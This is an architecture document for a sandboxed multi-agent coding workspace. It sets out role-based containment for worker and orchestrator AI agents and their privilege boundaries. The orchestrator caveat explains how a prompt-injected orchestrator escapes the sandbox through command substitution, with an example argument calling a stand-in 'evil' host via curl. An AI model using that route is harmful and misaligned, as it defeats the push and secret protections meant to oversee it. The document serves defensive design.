# Architecture

## The problem this workspace solves

One ticket usually touches several repositories, and agentic coding needs two
contradictory things: **freedom** (no confirmation prompt per command) and
**containment** (no pushes, no exfiltration, no credential reads). This
workspace resolves the contradiction with OS-level sandboxing per *role*, not
per command: agents get zero-prompt autonomy exactly because the operating
system makes the dangerous things impossible.

## Layers

Four security surfaces, each with its own `.claude/settings.json` and an OTEL
`workspace=` label for cost attribution:

| # | Layer | CWD | OTEL label | Created by |
|---|---|---|---|---|
| A | Root / management console | repo root | `ROOT` | /setup-workspace |
| C | Origins | `repositories/` | `REPOSITORIES` | /setup-workspace |
| D | Worker (per task) | `tasks/<T>/agents/worker/` | `<T>,purpose=<p>` | /open-task |
| E | Orchestrator (per task) | `tasks/<T>/agents/orchestrator/` | `<T>,purpose=<p>` | /open-task |

(The v2 origin of this design had a fifth layer, a separate
`orchestrators/task-manager` management console; here it is deliberately
merged into Root — the repository itself is the console. Worker and
orchestrator share one OTEL label; roles are not separable in cost data.)

- **Root** runs the management skills. Read-only bash whitelist without
  prompts; mutations prompt. GitHub network for clones/PRs. Cannot edit
  `repositories/**` (tool-level deny).
- **Origins** are worktree sources. Nobody edits them; all changes happen in
  task worktrees. They are gitignored by the workspace repo (the repo commits
  only `config/repos.json` — the *list*, not the clones).
- **Worker** does the work. See [settings-reference/worker.md](settings-reference/worker.md).
- **Orchestrator** commands the worker. No general bash at all — its shell
  surface is exactly five allowlisted scripts. See
  [settings-reference/orchestrator.md](settings-reference/orchestrator.md).

## Per-task anatomy

```
tasks/<TICKET>/
├── CLAUDE.md                    task overview (generated from templates)
├── docs/
│   ├── task.md                  full ticket body — the worker's source of truth
│   └── handoff/                 append-only agent message log (see handoff-protocol.md)
├── repositories/<repo>/         git worktrees, branch <branch_prefix><TICKET>
├── scripts/push-create-pr.sh    the only path to publishing (denyWrite for agents)
└── agents/
    ├── worker/                  CWD of tab-1 Claude; contains .git (empty file)
    │   ├── CLAUDE.md  initial-prompt.md  .claude/settings.json  [.mcp.json]
    └── orchestrator/            CWD of tab-3 Claude; contains .git (empty file)
        ├── CLAUDE.md  initial-prompt.md  .claude/settings.json  [.mcp.json]
        └── .claude/skills/      send / read / wait / add-repository + .worker-target
```

The empty `.git` **files** in each agent dir stop Claude Code from walking up
into the workspace repository — each agent sees a clean, non-repo CWD.
`tasks/` is entirely gitignored, so this never conflicts with the workspace
repo's own git.

### Worktrees, not clones

`repositories/<repo>` is cloned once. Task workspaces get
`git worktree add ../../tasks/<T>/repositories/<repo>` — near-zero disk cost,
shared object store, disposable. Rules baked into the tooling:

- Target paths are **relative**, so worktree links survive a workspace move.
- Worktree creation runs as **direct `git -C` commands** (from the open-task
  skill or from sandbox-excluded scripts) — never buried inside sandboxed
  scripts. Not because `worktree add` is inherently sandbox-blocked (it isn't —
  it only writes `.git/worktrees/`, verified S8-c; `git init`/`clone` are the
  ones that can never run sandboxed, S8-a/f), but because the *root console's*
  sandbox has no allowWrite covering the origins, and the same step usually
  needs `git fetch` (network) anyway.
- `type: knowledge` repos get **sparse checkouts** (`--cone`), scoped to
  `sparse_paths.<purpose>` from `config/repos.json`. `/setup-workspace` sets
  `extensions.worktreeConfig=true` on every origin so per-worktree sparse
  state works.
- Worker commits need **no write grant on the origin `.git`** — git's worktree
  handling reaches the shared `.git` on its own (verified S8-d; requires
  Claude Code ≥ 2.1.149). Instead /open-task injects **denyWrite pins** per
  task repo: origin `.git/config`, `.git/hooks`, and the worktree's
  `config.worktree` — the redirect surface a compromised worker would use to
  repoint `remote.origin.url` / `core.hooksPath` (the C-2 review finding).
  deny pins also survive permission-rule drift from `settings.local.json`
  ("don't ask again" approvals) — verified S2-n: local allow rules widen the
  OS write boundary, and project denyWrite is the only thing that beats them.

## cmux: three tabs per ticket

/open-task creates a cmux workspace named `<TICKET>`:

| Tab | Name | Runs |
|---|---|---|
| 1 | Worker Claude | `claude --permission-mode acceptEdits "<initial prompt>"` in `agents/worker/` |
| 2 | Terminal | plain shell in the task root — the human's lane (installs, docker) |
| 3 | Orchestrator Claude | `claude "<initial prompt>"` in `agents/orchestrator/` |

The worker's surface **UUID** is pinned into
`agents/orchestrator/.claude/skills/.worker-target` at creation time. UUIDs
survive focus changes and tab reordering; the orchestrator cannot rewrite the
file (denyWrite) and the messaging scripts reject `--workspace`/`--surface`
overrides — so an orchestrator can only ever command its own worker,
regardless of what a runtime prompt tries to tell it.

Without cmux, /open-task prints (and copies) manual startup commands; the
system degrades to single-session use.

### The command loop

```
orchestrator                           worker
    │  send-command.sh "<instruction>"     │
    ├──────────────────────────────────────▶  works: edit/build/test/commit
    │  wait-for-worker.sh (background)     │
    │           ...                        │  appends docs/handoff/..._worker.md
    │  RESULT status=idle ◀────────────────┤  goes idle (never exits)
    │  Read newest handoff file            │
    │  handle requests (push/PR, escalate) │
    │  append ..._orchestrator.md result   │
    └── next instruction ──────────────────▶
```

`wait-for-worker` derives worker state from the visible screen (the Claude
Code "esc to interrupt" indicator), debounced; it prints a single `RESULT`
line so the orchestrator never busy-polls.

## Privilege boundaries, summarized

| Action | Worker | Orchestrator | Root | Human (Tab 2) |
|---|---|---|---|---|
| Edit code in task worktrees | ✅ | ❌ | ❌ | (can, shouldn't) |
| Local build / lint / test | ✅ | ❌ | ❌ | ✅ |
| git commit (task repos) | ✅ | ❌ | ❌ | ✅ |
| git push / PR | ❌ | ✅ via push-create-pr.sh | ✅ via same script | ✅ |
| Install packages / docker | ❌ | ❌ | prompt | ✅ |
| Widen a sandbox | ❌ | ❌ | ✅ /update-task-sandbox | — |
| External network | ❌ | ❌ | github/npm only | ✅ |
| Read `~/.ssh`, `~/.aws`, gh/gcloud creds | ❌ | ❌ | ❌ | ✅ |

Push destinations are additionally restricted to
`config/workspace.json: allowed_push_orgs` by `.githooks/pre-push`, applied to
every repo and worktree under the workspace via `core.hooksPath` + a
`~/.gitconfig` includeIf (installed by /setup-workspace).

**Caveat — the orchestrator is only semi-trusted (review C-3).** Its five
privileged scripts run via sandbox `excludedCommands`, which escapes the whole
command line from the sandbox. The permission layer catches operator chains
(`;`/`&&`/`|`, since there is no `Bash(*)`) but does NOT see inside command
substitution `$(...)` (P4-c), so an argument like
`--body "$(curl … https://evil)"` executes unsandboxed. A prompt-injected
orchestrator can therefore run arbitrary host commands, which nullifies the
push allowlist and secret protections for that role. The worker — the more
easily injected role — stays fully confined; the orchestrator does not. Fully
closing this means running the scripts inside the sandbox with a scoped egress
instead of excluding them (needs runtime validation that push still works).
See [settings-reference/orchestrator.md](settings-reference/orchestrator.md).

## Configuration model

Everything an organization customizes lives in `config/` and `templates/`;
everything generated at runtime is gitignored. Placeholders
(`{{WORKSPACE_ROOT}}`, `{{TASK_DIR}}`, `{{TASK_DIR_H}}`, `{{TICKET_ID}}`, …)
are substituted **at runtime only** — no absolute path is ever committed.
`{{TASK_DIR_H}}` is the `~/`-anchored form used anywhere a path must
byte-match a sandbox `excludedCommands` entry.

Each task carries permanent metadata in `tasks/<T>/.task-meta.json`
(ticket, purpose, dev_kind, branch, repos, sandbox), written by finalize and
kept in sync by add-repository. It outlives the transient
`.workspace-meta.json` (deleted after the cmux phase) and is where
`/list-task` and `add-repository` read the **purpose** from — the OTEL env-var
scrape remains only as a fallback for tasks created before it existed.
(`/list-task` still derives the repo list from the worktree directories on
disk; the `repos` field is recorded for provenance and future use.)

Purposes are plug-in files: dropping `config/purposes/foo.json` (plus optional
`templates/purposes/foo/` overrides) adds a purpose; nothing else needs to
change. Template resolution order:
`templates/purposes/<p>/kinds/<k>/<file>` → `templates/purposes/<p>/<file>` →
`templates/default/<file>`.

## Known deltas from the v2 plugin (deliberate)

- Trust setup happens **before** the agents start (open-task phases
  init → finalize → trust → cmux), so the worker's first boot honors
  `permissions.allow`.
- Purpose `default_repos` / `mcp_servers` apply on the scripted (`--yes`)
  path too, not only interactively.
- No `--preset` flag, no area-based sandbox synthesis, no per-purpose
  `.mcp.json` templates — the v2 docs described these but the running code
  never implemented them; this repo standardizes on the working behavior.
- MCP tool-level read/write splitting between worker and orchestrator is not
  implemented in v1; both agents get the purpose's server list (worker access
  should be curbed per-server in templates/default/mcp.json if needed).
- v2 skills not carried over (yet): `update-task-purpose` (close and reopen
  the task instead), `sync-workspace-settings` (re-run /setup-workspace — it
  is idempotent), `open-code`, `cmux-diff-viewer` (`cmux diff` exists as a
  native command).
- Multi-worker archetypes (coder / reader / researcher / documenter with a
  `.worker-targets` map and a spawn-worker skill) are a planned extension;
  the single `.worker-target` + per-name `agents/<name>/` layout was chosen
  so that extension is additive. The concrete role taxonomy (boundary matrix,
  per-role egress, invariants) is designed in
  [agent-roles.md](agent-roles.md); the dispatch/`.worker-targets` design is in
  [agent-dispatch.md](agent-dispatch.md).
